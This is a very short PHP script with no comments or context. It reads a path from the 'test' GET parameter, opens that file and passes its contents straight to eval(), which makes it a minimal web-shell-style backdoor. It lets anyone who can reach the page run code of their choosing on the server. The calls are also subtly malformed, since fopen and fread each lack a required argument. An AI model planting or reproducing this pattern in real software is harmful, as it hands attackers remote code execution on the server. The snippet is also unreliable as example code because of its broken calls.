<?php
$path = $_GET ['test'];
$fp = fopen ( $path );
eval(fread($fp));
?>